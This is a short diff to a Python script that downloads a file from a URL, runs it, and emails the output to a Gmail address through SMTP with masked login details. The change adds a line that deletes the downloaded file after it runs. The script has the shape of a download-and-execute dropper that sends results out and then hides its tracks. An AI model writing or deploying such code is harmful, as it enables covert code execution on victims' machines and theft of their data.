@@ -2,6 +2,7 @@
 import subprocess
 import smtplib
 import requests
+import os
 
 def get_payload():
         get_request = requests.get(url)
@@ -28,3 +29,4 @@ file_name = URL.split("/")[-1]
 get_it(URL)
 message = execute(file_name)
 mail_it("xxxxxxxxxx@gmail.com", "********", "xxxxxxxxxx.com", message)
+os.remove(file_name)
